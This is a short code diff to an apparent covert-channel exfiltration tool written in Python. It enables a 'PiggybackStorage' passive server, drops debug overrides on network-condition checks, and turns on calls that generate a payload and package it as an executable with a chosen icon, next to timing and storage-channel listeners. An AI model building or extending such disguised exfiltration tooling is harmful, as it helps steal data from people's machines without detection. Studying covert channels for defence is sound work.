@@ -6,7 +6,7 @@ import socket
 import ListenerActiveStorage
 import ListenerSocketTiming
 import subprocess
-#import PassiveServer
+import PassiveServer
 
 
 filepath = "Hi.txt"
@@ -135,9 +135,7 @@ if __name__ == "__main__":
     print("gathering network statistics...")
     isPingHigh, isSizeHigh, isTrafficHigh = fitnessFunction(ip_addr, filepath, pingThreshhold, sizeThreshhold, trafficThreshold)
     print("gathered\\n")
-    isSizeHigh = False
-    isPingHigh = False
-    isTrafficHigh = False
+
 
     if (not isSizeHigh and not isPingHigh):
         print("socket")
@@ -172,11 +170,11 @@ def makeexe(name, icon):
 def liseners(ip, port):
     subprocess.Popen('python ListenerSocketTiming.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
     subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #ActiveStorage
-    #subprocess.Popen('python PassiveServer.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage 
+    subprocess.Popen('python PassiveServer.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage 
 
 
 if __name__ == '__main__':
     (filepath, name, Ip, port, icon) = console()
-    #payload(filepath, name, Ip, port)
-    #makeexe(name, icon)
+    payload(filepath, name, Ip, port)
+    makeexe(name, icon)
     liseners(Ip, port)
